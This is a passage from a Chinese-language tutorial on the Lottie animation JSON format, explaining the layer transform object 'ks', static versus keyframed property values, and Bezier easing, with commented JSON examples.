<p>以上13个通用属性中，有 <strong>3个</strong>（<code>ip</code>、<code>op</code>、<code>nm</code>）与根对象中的概念<strong>完全一致</strong>，仅作用域不同。<strong>1个</strong>（<code>ddd</code>）与根对象概念<strong>相似但有区别</strong>：根对象的 <code>ddd</code> 表示合成“是否包含”3D元素，而图层的 <code>ddd</code> 表示其“本身是否为”3D图层。其余 <strong>9个</strong>（<code>ty</code>, <code>ind</code>, <code>st</code>, <code>sr</code>, <code>ks</code>, <code>ao</code>, <code>parent</code>, <code>cl</code>, <code>ln</code>）则是<strong>图层专有的核心属性</strong>，它们共同定义了图层在时间与空间中的基本状态。</p>
<p>接下来，我们将首先深入解析其中最核心的 <strong><code>ks</code>（变换属性）</strong>  对象，它是驱动所有图层运动与变化的关键。</p>
<h2 data-id="heading-7"><strong>三、变换属性 - 位置、旋转、缩放</strong>⭐️</h2>
<h3 data-id="heading-8">ks 对象概览</h3>
<p><code>ks</code>（Transform）是所有图层的核心动画容器，它定义了图层在空间中的位置、大小、旋转、透明度等基础变换状态。其名称 <strong><code>ks</code></strong> 是 <strong>Keyable Styled Properties（可关键帧的样式化属性）</strong>  的缩写，这精准概括了其两大核心特性：</p>
<ul>
<li><strong><code>k</code>（Keyable）</strong> ：指这些属性<strong>可被设置为关键帧</strong>，是实现所有逐帧动画的基础。</li>
<li><strong><code>s</code>（Styled）</strong> ：指这些属性<strong>可被动态驱动或赋予样式</strong>，支持通过数据或表达式进行复杂控制。</li>
</ul>
<p>因此，<code>ks</code> 对象不仅描述图层的静态空间状态，更是承载其所有运动与变换动画的<strong>数据载体</strong>。所有基础动画（如移动、缩放、旋转、淡入淡出）都通过在此对象内定义关键帧来实现。</p>
<h3 data-id="heading-9"><strong>ks 的完整属性表</strong></h3>





















































<table><thead><tr><th>属性</th><th>全称</th><th>默认值</th><th>作用</th></tr></thead><tbody><tr><td><strong><code>a</code></strong></td><td>Anchor Point</td><td><code>[0, 0, 0]</code></td><td><strong>锚点</strong>：图层变换的基准中心点（支点）。</td></tr><tr><td><strong><code>p</code></strong></td><td>Position</td><td><code>[0, 0, 0]</code></td><td><strong>位置</strong>：图层在画布中的坐标。</td></tr><tr><td><strong><code>s</code></strong></td><td>Scale</td><td><code>[100, 100, 100]</code></td><td><strong>缩放</strong>：图层的尺寸比例（以百分比表示）。</td></tr><tr><td><strong><code>r</code></strong></td><td>Rotation</td><td><code>0</code></td><td><strong>旋转</strong>：图层的旋转角度（单位为度）。</td></tr><tr><td><strong><code>o</code></strong></td><td>Opacity</td><td><code>100</code></td><td><strong>不透明度</strong>：图层的透明度（100为完全不透明，0为完全透明）。</td></tr><tr><td><strong><code>sk</code></strong></td><td>Skew</td><td><code>0</code></td><td><strong>倾斜</strong>：图层的倾斜角度（单位为度）。</td></tr><tr><td><strong><code>sa</code></strong></td><td>Skew Axis</td><td><code>0</code></td><td><strong>倾斜轴</strong>：定义倾斜操作所沿的轴向角度（单位为度）。</td></tr></tbody></table>
<blockquote>
<p> 3D 图层特殊形式：当 ddd=1 时，p 可能被拆分为 px、py、pz 三个独立属性。</p>
</blockquote>
<h3 data-id="heading-10"><strong>属性值的两种数据形态</strong></h3>
<p>每个变换属性的值均以统一的结构表示，分为 <strong>静态值</strong> 与 <strong>动画值</strong> 两种形态，通过 <code>a</code> 字段区分。</p>
<h4 data-id="heading-11"><strong>1. 静态值 (<code>a</code>: 0)</strong></h4>
<p>属性在整个时间轴上保持不变，结构简洁。</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"r"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>        <span class="hljs-comment">// 静态标识</span>
    <span class="hljs-attr">"k"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">45</span>        <span class="hljs-comment">// 固定值：旋转45度</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h4 data-id="heading-12"><strong>2. 动画值 (<code>a</code>: 1)</strong></h4>
<p>属性值随时间变化，通过关键帧数组 (<code>k</code>) 定义。</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"r"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span>        <span class="hljs-comment">// 动画标识</span>
    <span class="hljs-attr">"k"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>         <span class="hljs-comment">// 关键帧数组</span>
      <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"t"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>    <span class="hljs-comment">// 时间点（帧）</span>
        <span class="hljs-attr">"s"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>  <span class="hljs-comment">// 起始值</span>
        <span class="hljs-attr">"e"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">360</span><span class="hljs-punctuation">]</span> <span class="hljs-comment">// 结束值</span>
      <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
      <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"t"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">60</span><span class="hljs-punctuation">,</span>   <span class="hljs-comment">// 下一关键帧时间点</span>
        <span class="hljs-attr">"s"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">360</span><span class="hljs-punctuation">]</span> <span class="hljs-comment">// 该帧的数值（结束时省略"e"）</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>关键帧核心字段说明</strong>：</p>
<ul>
<li><strong><code>t</code> (time)</strong> ：关键帧所处的时间点（帧序号）。</li>
<li><strong><code>s</code> (start value)</strong> ：此关键帧的起始值。</li>
<li><strong><code>e</code> (end value)</strong> ：朝向下一关键帧的<strong>目标值</strong>。最后一个关键帧可省略。</li>
<li><strong><code>i</code> / <code>o</code></strong>：定义属性变化速率（缓动）的贝塞尔曲线控制点，将在后续章节详述。</li>
</ul>
<p>此结构是 Lottie 实现所有基础运动（位移、缩放、旋转、淡入淡出）的通用数据范式。</p>
<h3 data-id="heading-13">🎨小试牛刀：动手验证核心概念</h3>
<p>通过前面的学习，我们已经掌握了 Lottie JSON 的顶层结构和核心属性。现在，让我们通过一个具体的例子，动手验证如何配置一个基础的静态场景。</p>
<p>在本例中，我们将使用一张图片，创建一个<strong>静态的图片图层</strong>。您将在下图中看到（一个静态图，一个旋转图）：</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/797a4950337a4e9ab0ddb4de2e7afc33~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOo5Y2r5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768876452&amp;x-signature=yzgDCdB54V1rtVwQfYETtwLpQco%3D" alt="录屏2026-01-07 11.51.03 (1).gif" loading="lazy"/></p>
<blockquote>
<p><strong>说明</strong>：上图的 GIF 展示了包含旋转动画的完整效果。而下面的 JSON 配置，我们将首先完成<strong>左侧静态图片</strong>的搭建。这能让我们专注于已学的<strong>静态属性配置</strong>（<code>a: 0</code>）。右侧的旋转动画，将在我们学习了关键帧系统后，通过简单地修改 <code>r</code>（旋转）属性即可实现。</p>
</blockquote>
<p>以下是完整的 Lottie JSON 配置，已附上详尽的注释：</p>
<pre><code class="hljs language-js" lang="js">{
  <span class="hljs-comment">// ========== 顶层元数据：动画的全局定义 ==========</span>
  <span class="hljs-string">"v"</span>: <span class="hljs-string">"5.7.4"</span>,              <span class="hljs-comment">// Bodymovin 插件版本</span>
  <span class="hljs-string">"fr"</span>: <span class="hljs-number">30</span>,                  <span class="hljs-comment">// 帧率：30fps</span>
  <span class="hljs-string">"ip"</span>: <span class="hljs-number">0</span>,                   <span class="hljs-comment">// 起始帧：从第0帧开始</span>
  <span class="hljs-string">"op"</span>: <span class="hljs-number">90</span>,                  <span class="hljs-comment">// 结束帧：到第90帧结束（总时长 = (90-0)/30 = 3秒）</span>
  <span class="hljs-string">"w"</span>: <span class="hljs-number">800</span>,                  <span class="hljs-comment">// 画布宽度：800像素</span>
  <span class="hljs-string">"h"</span>: <span class="hljs-number">600</span>,                  <span class="hljs-comment">// 画布高度：600像素</span>
  <span class="hljs-string">"nm"</span>: <span class="hljs-string">"变换属性演示"</span>,        <span class="hljs-comment">// 合成名称</span>
  <span class="hljs-string">"ddd"</span>: <span class="hljs-number">0</span>,                  <span class="hljs-comment">// 3D标识：0表示不包含3D图层</span>
  
  <span class="hljs-comment">// ========== Assets：可复用资源库 ==========</span>
  <span class="hljs-string">"assets"</span>: [
    {
      <span class="hljs-string">"id"</span>: <span class="hljs-string">"image_0"</span>,       <span class="hljs-comment">// 资源ID，供图层通过 refId 引用</span>
      <span class="hljs-string">"w"</span>: <span class="hljs-number">500</span>,              <span class="hljs-comment">// 图片原始宽度</span>
      <span class="hljs-string">"h"</span>: <span class="hljs-number">500</span>,              <span class="hljs-comment">// 图片原始高度</span>
      <span class="hljs-string">"u"</span>: <span class="hljs-string">""</span>,               <span class="hljs-comment">// 图片URL基础路径（空表示使用完整路径）</span>
      <span class="hljs-string">"p"</span>: <span class="hljs-string">"https://img11.360buyimg.com/img/jfs/t1/383242/14/16667/276460/695dd5ccF565013e8/02761c81c82b92d4.png"</span>,  <span class="hljs-comment">// 图片完整URL</span>
      <span class="hljs-string">"e"</span>: <span class="hljs-number">0</span>                 <span class="hljs-comment">// 是否嵌入：0表示外部链接</span>
    }
  ],
  
  <span class="hljs-comment">// ========== Layers：图层序列（从下到上渲染） ==========</span>
  <span class="hljs-string">"layers"</span>: [
    <span class="hljs-comment">// ---------- 图层1：静态图片（展示静态值 a:0） ----------</span>
    {
      <span class="hljs-string">"ddd"</span>: <span class="hljs-number">0</span>,              <span class="hljs-comment">// 该图层不是3D图层</span>
      <span class="hljs-string">"ind"</span>: <span class="hljs-number">1</span>,              <span class="hljs-comment">// 图层索引：1（唯一标识）</span>
      <span class="hljs-string">"ty"</span>: <span class="hljs-number">2</span>,               <span class="hljs-comment">// 图层类型：2 = Image Layer（图像图层）</span>
      <span class="hljs-string">"nm"</span>: <span class="hljs-string">"静态图片"</span>,       <span class="hljs-comment">// 图层名称</span>
      <span class="hljs-string">"refId"</span>: <span class="hljs-string">"image_0"</span>,    <span class="hljs-comment">// 引用 assets 中 id 为 "image_0" 的资源</span>
      <span class="hljs-string">"sr"</span>: <span class="hljs-number">1</span>,               <span class="hljs-comment">// 时间拉伸：1 = 正常速度</span>
      
      <span class="hljs-comment">// ===== ks：变换属性（Transform）=====</span>
      <span class="hljs-string">"ks"</span>: {
        <span class="hljs-comment">// ----- o：不透明度（Opacity）-----</span>
        <span class="hljs-string">"o"</span>: {
          <span class="hljs-string">"a"</span>: <span class="hljs-number">0</span>,            <span class="hljs-comment">// 静态值标识（a=0 表示不动画）</span>
          <span class="hljs-string">"k"</span>: <span class="hljs-number">100</span>           <span class="hljs-comment">// 固定值：100%不透明</span>
        },
        
        <span class="hljs-comment">// ----- r：旋转（Rotation）-----</span>
        <span class="hljs-string">"r"</span>: {
          <span class="hljs-string">"a"</span>: <span class="hljs-number">0</span>,            <span class="hljs-comment">// 静态值标识</span>
          <span class="hljs-string">"k"</span>: <span class="hljs-number">45</span>            <span class="hljs-comment">// 固定值：旋转45度</span>
        },
        
        <span class="hljs-comment">// ----- p：位置（Position）-----</span>
        <span class="hljs-string">"p"</span>: {
          <span class="hljs-string">"a"</span>: <span class="hljs-number">0</span>,            <span class="hljs-comment">// 静态值标识</span>
          <span class="hljs-string">"k"</span>: [<span class="hljs-number">250</span>, <span class="hljs-number">300</span>, <span class="hljs-number">0</span>] <span class="hljs-comment">// 固定位置：[x, y, z] = 左侧250px，顶部300px</span>
        },
        
        <span class="hljs-comment">// ----- a：锚点（Anchor Point）-----</span>
        <span class="hljs-string">"a"</span>: {
          <span class="hljs-string">"a"</span>: <span class="hljs-number">0</span>,            <span class="hljs-comment">// 静态值标识</span>
          <span class="hljs-string">"k"</span>: [<span class="hljs-number">250</span>, <span class="hljs-number">250</span>, <span class="hljs-number">0</span>] <span class="hljs-comment">// 锚点在图片中心（500x500图片的中心点）</span>
        },
        
        <span class="hljs-comment">// ----- s：缩放（Scale）-----</span>
        <span class="hljs-string">"s"</span>: {
          <span class="hljs-string">"a"</span>: <span class="hljs-number">0</span>,            <span class="hljs-comment">// 静态值标识</span>
          <span class="hljs-string">"k"</span>: [<span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">100</span>] <span class="hljs-comment">// 缩放到30%（显示为150x150）</span>
        }
      },
      
      <span class="hljs-string">"ao"</span>: <span class="hljs-number">0</span>,               <span class="hljs-comment">// 自动定向：关闭</span>
      <span class="hljs-string">"ip"</span>: <span class="hljs-number">0</span>,               <span class="hljs-comment">// 图层入点：第0帧开始显示</span>
      <span class="hljs-string">"op"</span>: <span class="hljs-number">90</span>,              <span class="hljs-comment">// 图层出点：第90帧结束显示</span>
      <span class="hljs-string">"st"</span>: <span class="hljs-number">0</span>,               <span class="hljs-comment">// 起始时间偏移：0（无偏移）</span>
      <span class="hljs-string">"bm"</span>: <span class="hljs-number">0</span>                <span class="hljs-comment">// 混合模式：0 = Normal（正常）</span>
    }
  ],
  
  <span class="hljs-comment">// ========== Chars：矢量字形定义（本例未使用）==========</span>
  <span class="hljs-string">"chars"</span>: []
}
</code></pre>
<p>这个示例是一个“知识检查点”，清晰地展示了：</p>
<ul>
<li><strong>顶层元数据</strong> (<code>v</code>, <code>fr</code>, <code>w</code>, <code>h</code>...) 定义了动画的舞台（3秒、800x600的画布）。</li>
<li><strong>资源 (<code>assets</code>)</strong>  定义了唯一可用的图片素材，并通过 <code>id</code> 标识。</li>
<li><strong>图层 (<code>layers</code>)</strong>  通过 <code>refId</code> 引用该资源，将其实例化到舞台上。</li>
<li><strong><code>ks</code> 变换对象</strong> 决定了这个实例的最终状态：位于画布左侧，缩小至30%，并旋转了45度。所有属性均以<strong>静态值 (<code>a: 0</code>)</strong>  定义。</li>
</ul>
<p>至此，您已经掌握了如何构建一个 Lottie 动画的<strong>静态骨架</strong>——定义舞台、准备素材、放置元素并设置其初始状态。在上方的预览图中，您也看到了动画的潜力：<strong>只需将 <code>r</code>（旋转）属性的 <code>a</code> 值从 <code>0</code> 改为 <code>1</code>，并配上关键帧数据，静态图片就能旋转起来。</strong></p>
<p>那么，<code>a: 1</code> 模式下的 <code>k</code> 数组究竟如何定义？多个关键帧之间如何平滑过渡？动画的运动节奏又由什么控制？接下来，我们就将深入动画的核心，解析<strong>关键帧、插值与缓动</strong>的完整系统。</p>
<hr/>
<h2 data-id="heading-14"><strong>四、深入动画 - 关键帧、插值与缓动</strong>⭐️</h2>
<p>在上一章的"小试牛刀"中，我们看到了静态图片与旋转图片的对比效果。右侧的旋转效果正是通过<strong>关键帧动画</strong>实现的。现在，让我们深入解析这个旋转动画的完整JSON配置，揭开Lottie动画系统的核心机制。</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/797a4950337a4e9ab0ddb4de2e7afc33~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOo5Y2r5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768876452&amp;x-signature=yzgDCdB54V1rtVwQfYETtwLpQco%3D" alt="录屏2026-01-07 11.51.03 (1).gif" loading="lazy"/></p>
<p>让我们对比一下 demo 中两个图层的配置，看看静态图片是如何"动"起来的：</p>
<p><strong>静态图片（左侧）：</strong></p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-attr">"r"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>            <span class="hljs-comment">// 静态值标识</span>
  <span class="hljs-attr">"k"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">45</span>            <span class="hljs-comment">// 固定值：旋转45度</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>旋转图片（右侧）：</strong></p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-attr">"r"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span>            <span class="hljs-comment">// 动画值标识（a=1 表示有关键帧动画）</span>
  <span class="hljs-attr">"k"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>             <span class="hljs-comment">// 关键帧数组</span>
    <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"i"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"x"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">0.667</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"y"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">1</span><span class="hljs-punctuation">]</span> <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>   <span class="hljs-comment">// 入缓动</span>
      <span class="hljs-attr">"o"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"x"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">0.333</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"y"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">]</span> <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>   <span class="hljs-comment">// 出缓动</span>
      <span class="hljs-attr">"t"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>                            <span class="hljs-comment">// 时间点：第0帧</span>
      <span class="hljs-attr">"s"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">]</span>                           <span class="hljs-comment">// 起始值：0度</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"t"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">90</span><span class="hljs-punctuation">,</span>                           <span class="hljs-comment">// 时间点：第90帧</span>
      <span class="hljs-attr">"s"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">360</span><span class="hljs-punctuation">]</span>                         <span class="hljs-comment">// 结束值：360度</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>核心差异总结：</strong></p>






























<table><thead><tr><th>特征</th><th>静态值 (<code>a: 0</code>)</th><th>动画值 (<code>a: 1</code>)</th></tr></thead><tbody><tr><td><code>k</code> 的类型</td><td>单个数值或数组</td><td>关键帧对象数组</td></tr><tr><td>时间轴</td><td>无时间概念，始终保持固定值</td><td>在时间轴上定义多个状态点</td></tr><tr><td>缓动控制</td><td>无</td><td>通过 <code>i</code> 和 <code>o</code> 控制运动节奏</td></tr><tr><td>适用场景</td><td>静态属性（如固定位置、固定角度）</td><td>需要随时间变化的属性（移动、旋转、缩放等）</td></tr></tbody></table>
<h3 data-id="heading-15"><strong>关键帧数组结构解析</strong></h3>
<p>当属性设置为动画值（<code>a: 1</code>）时，<code>k</code> 字段不再是一个简单值，而是一个<strong>关键帧对象数组</strong>。每个关键帧对象定义了动画在特定时间点的状态。</p>
<h4 data-id="heading-16"><strong>核心字段说明</strong></h4>















































<table><thead><tr><th>字段</th><th>类型</th><th>必选</th><th>描述</th></tr></thead><tbody><tr><td><strong><code>t</code></strong></td><td><code>number</code></td><td>是</td><td><strong>时间点（Time）</strong>：该关键帧在时间轴上的位置，单位为帧。</td></tr><tr><td><strong><code>s</code></strong></td><td><code>array</code></td><td>是</td><td><strong>起始值（Start Value）</strong>：该关键帧的属性值。对于旋转是 <code>[角度]</code>，位置是 <code>[x, y, z]</code>。</td></tr><tr><td><strong><code>e</code></strong></td><td><code>array</code></td><td>否</td><td><strong>结束值（End Value）</strong>：从当前关键帧到下一关键帧的目标值。<strong>通常省略</strong>，渲染器会自动使用下一关键帧的 <code>s</code> 值。</td></tr><tr><td><strong><code>i</code></strong></td><td><code>object</code></td><td>否</td><td><strong>入缓动（In Tangent）</strong>：定义<strong>进入</strong>当前关键帧时的速度变化曲线（贝塞尔控制点）。</td></tr><tr><td><strong><code>o</code></strong></td><td><code>object</code></td><td>否</td><td><strong>出缓动（Out Tangent）</strong>：定义<strong>离开</strong>当前关键帧时的速度变化曲线（贝塞尔控制点）。</td></tr><tr><td><strong><code>h</code></strong></td><td><code>number</code></td><td>否</td><td><strong>保持帧（Hold）</strong>：值为 <code>1</code> 时，表示该关键帧到下一关键帧之间<strong>不插值</strong>，保持当前值（阶跃动画）。</td></tr></tbody></table>
<blockquote>
<p><strong>说明</strong>：</p>
<ol>
<li><strong><code>s</code> 的数据类型</strong>：虽然官方 schema 中定义为 <code>number</code>，但在实际使用中，<code>s</code> 通常是<strong>数组</strong>（如 <code>[0]</code> 表示旋转 0 度，<code>[100, 200, 0]</code> 表示位置）。这是为了统一处理单维和多维属性。</li>
<li><strong><code>e</code> 字段的实际使用</strong>：在大多数情况下，<code>e</code> 字段会被省略，渲染器会自动从下一个关键帧的 <code>s</code> 值推断目标值。只有在需要显式控制插值目标时才会使用。</li>
<li><strong>最后一帧</strong>：最后一个关键帧通常只有 <code>t</code> 和 <code>s</code>，不需要 <code>i</code>、<code>o</code>、<code>e</code>（因为没有下一个关键帧）。</li>
</ol>
</blockquote>
<h4 data-id="heading-17"><strong>缓动控制点的结构</strong></h4>
<p><code>i</code> 和 <code>o</code> 对象定义了贝塞尔曲线的控制点，用于控制动画的加速度：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"i"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"x"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">0.667</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>  <span class="hljs-comment">// 入缓动的 X 轴控制点（时间维度，范围 0-1）</span>
    <span class="hljs-attr">"y"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">1</span><span class="hljs-punctuation">]</span>       <span class="hljs-comment">// 入缓动的 Y 轴控制点（数值维度，通常 0-1，但可超出）</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"o"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"x"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">0.333</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>  <span class="hljs-comment">// 出缓动的 X 轴控制点</span>
    <span class="hljs-attr">"y"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">]</span>       <span class="hljs-comment">// 出缓动的 Y 轴控制点</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<ul>
<li><strong><code>x</code> 数组</strong>：控制<strong>时间进度</strong>的变化率（水平方向）</li>
<li><strong><code>y</code> 数组</strong>：控制<strong>数值变化</strong>的速率（垂直方向）</li>
<li><strong>数组长度</strong>：对于单维属性（如旋转 <code>r</code>），数组长度为 1；对于多维属性（如位置 <code>p</code>），数组长度对应维度数（如 <code>[0.5, 0.3]</code> 表示 X、Y 两个维度的独立控制）</li>
</ul>
<blockquote>
<p><strong>前端知识关联</strong>：<code>i</code> 与 <code>o</code> 定义的贝塞尔曲线，其作用与 CSS 中的 <code>transition-timing-function</code> 或 <code>animation-timing-function</code> 完全一致，用于创造非匀速的动画效果。区别在于，CSS 使用一个二维的 <code>cubic-bezier(x1, y1, x2, y2)</code>，而 Lottie 的 <code>i</code> 和 <code>o</code> 允许为每个属性维度单独定义控制点，控制更为精细。</p>
<p><strong>工具推荐</strong>：如果您需要直观地创建或理解贝塞尔曲线，强烈推荐使用在线工具 <strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fcubic-bezier.com%2F" target="_blank" title="https://cubic-bezier.com/" ref="nofollow noopener noreferrer">cubic-bezier.com</a></strong>。您可以在那里调整曲线并获取对应的 <code>cubic-bezier()</code> 值，其原理与 Lottie 的 <code>i</code>/<code>o</code> 控制点相通，是理解和调试动画缓动的绝佳助手。</p>
</blockquote>
<h3 data-id="heading-18"><strong>关键帧的工作流程</strong></h3>
<p>以 demo 中的旋转动画为例，让我们逐步拆解渲染器如何处理关键帧：</p>
<h4 data-id="heading-19"><strong>第 1 步：解析关键帧数组</strong></h4>
<pre><code class="hljs language-json" lang="json"><span class="hljs-attr">"k"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
  <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"t"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>        <span class="hljs-comment">// 第0帧</span>
    <span class="hljs-attr">"s"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>      <span class="hljs-comment">// 旋转角度 0°</span>
    <span class="hljs-attr">"i"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"x"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">0.667</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"y"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">1</span><span class="hljs-punctuation">]</span> <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"o"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"x"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">0.333</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"y"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">]</span> <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"t"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">90</span><span class="hljs-punctuation">,</span>       <span class="hljs-comment">// 第90帧</span>
    <span class="hljs-attr">"s"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">360</span><span class="hljs-punctuation">]</span>     <span class="hljs-comment">// 旋转角度 360°</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">]</span>
</code></pre>
<p>渲染器识别出：</p>
<ul>
<li>动画从第 0 帧开始，到第 90 帧结束</li>
<li>起始角度 0°，结束角度 360°</li>
<li>需要在这 90 帧之间进行插值计算</li>
</ul>
<h4 data-id="heading-20"><strong>第 2 步：插值计算（以第 45 帧为例）</strong></h4>
<p>当播放到第 45 帧时，渲染器需要计算此时的旋转角度：</p>
<ol>
<li><strong>计算时间进度</strong>：<code>progress = (45 - 0) / (90 - 0) = 0.5</code>（已完成 50%）</li>
<li><strong>应用缓动函数</strong>：根据 <code>i</code> 和 <code>o</code> 的贝塞尔控制点，将线性进度 <code>0.5</code> 转换为缓动后的进度（假设为 <code>0.55</code>）</li>
<li><strong>计算属性值</strong>：<code>angle = 0 + (360 - 0) × 0.55 = 198°</code></li>
</ol>
<h4 data-id="heading-21"><strong>第 3 步：渲染当前帧</strong></h4>
<p>渲染器将计算出的 198° 应用到图层的旋转属性，完成该帧的绘制。</p>
<h4 data-id="heading-22"><strong>关键帧的连续性</strong></h4>
<p>在多个关键帧的场景中，渲染器会：</p>
<ul>
<li><strong>定位当前区间</strong>：找到当前时间点所在的关键帧区间（如第 30 帧位于第 0 帧和第 90 帧之间）</li>
<li><strong>使用对应缓动</strong>：应用该区间起始关键帧的 <code>o</code>（出缓动）和结束关键帧的 <code>i</code>（入缓动）</li>
<li><strong>独立插值</strong>：对于多维属性（如位置 <code>[x, y, z]</code>），每个维度独立进行插值计算</li>
</ul>
<h3 data-id="heading-23"><strong>本章小结</strong></h3>
<p>至此，我们已经掌握了 Lottie 动画系统的“动力源”：<strong>关键帧、插值与缓动</strong>。</p>
<ul>
<li><strong>静态与动画的开关</strong>：通过 <code>a</code> 字段 (<code>0</code> 或 <code>1</code>) 切换属性的静态与动态模式，是理解 Lottie 动画逻辑的第一课。</li>
